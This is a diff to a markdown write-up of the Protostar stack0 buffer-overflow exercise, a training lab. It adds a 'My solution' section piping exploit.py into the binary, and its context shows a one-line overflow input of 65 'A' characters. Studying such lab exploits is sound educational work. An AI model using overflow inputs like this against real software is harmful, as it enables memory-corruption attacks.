@@ -36,5 +36,10 @@ Because gets() is an unsafe function.
 $ python -c "print 'A'*65" | ./stack0
 ```
 
+##### My solution
+```
+python exploit.py | ./stack0
+```
+
 ##### Reference
 <https://github.com/Wins0n/Exploit-Exercises_ProtoStar/blob/master/protostar_part1.md>
